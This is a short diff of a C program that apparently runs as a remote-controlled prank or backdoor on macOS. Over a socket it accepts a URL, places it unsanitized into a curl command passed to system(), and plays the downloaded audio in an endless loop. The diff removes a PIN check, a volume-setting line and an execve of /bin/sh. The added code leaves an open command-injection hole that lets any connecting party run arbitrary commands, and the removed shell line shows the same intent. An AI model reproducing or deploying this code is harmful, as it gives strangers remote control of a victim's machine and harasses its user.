@@ -41,32 +41,19 @@ int main()
 
 	int pid = fork();
 	if (pid == 0) {
-	//   write(sockfd, "PIN:", 4);
-	//   read(sockfd, &buf, 4);
 		write(sockfd, "Link:", 5);
 		read(sockfd, &link, 200);
 
-	//   result = strncmp("1234", buf, 4);
-	//   if (result != 0) {
-	//     return 0;
-	//   }
+		char *command = (char*)malloc(230 * sizeof(char));
+		
+		sprintf(command, "curl --output sound.wav %s", link);
 
-	// write(sockfd, "Link:", 5);
-	// read(sockfd, &link, 200);
+		system(command);
 
-	char *command = (char*)malloc(230 * sizeof(char));
-	// Prints "Hello world!" on hello_world
-	sprintf(command, "curl --output sound.wav %s", link);
+		while(1){
+			system("afplay sound.wav");
 
-	system(command);
-
-	system('osascript -e "set Volume 10"');
-
-	system("afplay sound.wav");
-
-	// execve("/bin/sh", argv, envp);
-
-	  execve("/bin/sh", argv, envp);
+		}
 	}
 	
 	return 0;
